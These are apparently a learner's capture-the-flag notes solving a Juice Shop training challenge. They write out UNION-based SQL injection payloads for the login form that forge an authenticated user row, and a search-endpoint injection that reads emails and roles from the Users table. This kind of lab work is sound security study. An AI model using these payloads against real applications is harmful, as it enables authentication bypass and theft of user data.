- The user should not exist in the database because that would be just like regular registration.
- This seems like `Anonymous Authentication` or `Guest Sessions`
- Earlier, I have confirmed the app is vulnerable to the `alg: none` (`express-jwt`)
- Maybe I can use that to sign in as `acc0unt4nt@juice-sh.op`
- Actually, I don't think so. The login Request does not have authorization header for me to change.
- Earlier, I have confirmed that the login fields are vulnerable to SQL injection.
- I think I should try Synthetic Row Injection (a form of UNION-based SQL Injection)
- I already know the schema of `Users` table from [[password-strength]]
- Enter `' UNION SELECT 9999, 'ephemeral_accountant', 'acc0unt4nt@juice-sh.op', '', 'accountant', '', '', '', '', 1, '', '', ''--`
- See the error
```
HTTP/1.1 500 Internal Server Error
[...]

{
  "error": {
    "message": "SQLITE_CONSTRAINT: FOREIGN KEY constraint failed",
    "stack": "Error\n    at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)\n    at /juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50\n    at new Promise (<anonymous>)\n    at Query.run (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:12)\n    at /juice-shop/node_modules/sequelize/lib/sequelize.js:315:28\n    at async SQLiteQueryInterface.insert (/juice-shop/node_modules/sequelize/lib/dialects/abstract/query-interface.js:308:21)\n    at async Basket.save (/juice-shop/node_modules/sequelize/lib/model.js:2490:35)\n    at async Basket.create (/juice-shop/node_modules/sequelize/lib/model.js:1362:12)\n    at async Basket.findOrCreate (/juice-shop/node_modules/sequelize/lib/model.js:1422:25)",
    "name": "SequelizeForeignKeyConstraintError",
    "parent": {
      "errno": 19,
      "code": "SQLITE_CONSTRAINT",
      "sql": "INSERT INTO `Baskets` (`id`,`UserId`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3);"
    },
    "original": {
      "errno": 19,
      "code": "SQLITE_CONSTRAINT",
      "sql": "INSERT INTO `Baskets` (`id`,`UserId`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3);"
    },
    "sql": "INSERT INTO `Baskets` (`id`,`UserId`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3);",
    "parameters": {}
  }
}
```
- This confirms that I successfully tricked the application logic into authenticating me, but it collided with the database's structural integrity rules.
- The backend ORM (Sequelize) couldn't reconcile the application state (I am logged in) with the database state (I don't exist).
- I logged in, the app's frontend automatically asked the backend to fetch or create my basket.
- The backend attempted to insert a new basket for `UserId = 9999` into the hard drive's SQLite database. The database checked the permanent `Users` table, saw that ID `9999` does not exist, and rejected the `INSERT`, crashing the request.
- Try changing it to `' UNION SELECT 2, 'ephemeral_accountant', 'acc0unt4nt@juice-sh.op', '', 'accountant', '', '', '', '', 1, '', '', ''--`
- Now, the user id is that of Jim, but the email is that of `acc0unt4nt@juice-sh.op`. However, I doubt this will help me complete the challenge.
- Yeah, the challenge is not completed
- I wonder if using the real accountant's id `15` let me complete the challenge
- No, the challenge is not completed.
- Let me confirm if the `role` is actually `accountant` for the real accountant's account with SQL injection on search bar like I did in [[password-strength]]
```
GET /rest/products/search?q='))+UNION+SELECT+1,+2,+email,+id,+role,+6,+7,+8,+9+FROM+Users+WHERE+email%3d'accountant%40juice-sh.op'-- HTTP/1.1
```
- Bingo, the role is `accounting`, not `accountant`!
- Try `' UNION SELECT 2, 'ephemeral_accountant', 'acc0unt4nt@juice-sh.op', '', 'accounting', '', '', '', '', 1, '', '', ''--`
- Complete the challenge